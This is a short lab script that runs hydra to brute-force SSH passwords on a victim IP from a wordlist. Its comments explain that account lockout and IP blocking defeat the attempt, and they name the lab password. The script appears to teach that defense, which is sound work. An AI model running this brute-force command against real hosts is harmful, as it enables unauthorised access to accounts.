#!/usr/bin/env bash
# SSH brute-force attack (run from the ATTACKER host). Educational lab use only.
# Usage: ./run-attack.sh <victim-ip>
set -euo pipefail
VICTIM="${1:?usage: ./run-attack.sh <victim-ip>}"
hydra -l demo -P "$(dirname "$0")/wordlist.txt" -t 4 "ssh://$VICTIM"
# The correct password (CorrectHorse!42) is line 8, but the account locks and the
# IP is blocked after the 3rd attempt, so hydra reports "0 valid password found".
